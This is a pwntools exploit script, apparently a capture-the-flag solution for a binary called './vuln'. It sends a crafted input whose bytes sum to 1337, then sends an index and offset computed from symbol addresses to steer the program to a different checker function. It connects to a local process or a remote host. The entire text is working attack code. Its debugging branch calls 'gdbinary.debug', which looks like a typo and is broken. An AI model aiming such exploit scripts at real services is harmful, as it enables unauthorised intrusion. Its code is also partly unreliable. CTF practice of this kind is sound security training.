#!/bin/python3
from pwn import *

##################
# PWNTOOLS SETUP #
##################
context.terminal = "kitty"
# context.terminal = 'wt.exe wsl -d Ubuntu'.split()

binary = context.binary = ELF("./vuln")

host = args.HOST or "localhost"
port = int(args.PORT or 25565)

if args.LOCAL:
    if args.GDBSCRIPT:
        io: tube = gdbinary.debug(binary.path, gdbscript=args.GDBSCRIPT)
    else:
        io: tube = process(binary.path)
else:
    io: tube = remote(host, port)

###########
# EXPLOIT #
###########
story = b"Z" * 14 + b"M"
assert sum(story) == 1337

io.sendline(story)

index = (binary.symbols["check"] - binary.symbols["fun"]) // 4
assert (binary.symbols["check"] - binary.symbols["fun"]) % 4 == 0
assert (binary.symbols["check"] - binary.symbols["fun"]) < 10

offset = binary.symbols["easy_checker"] - binary.symbols["hard_checker"]

payload = flat([
    str(index).encode(),
    b" ",
    str(offset).encode(),
])
print(payload)
io.sendline(payload)
print(io.recvall().decode("utf-8", errors="replace"))
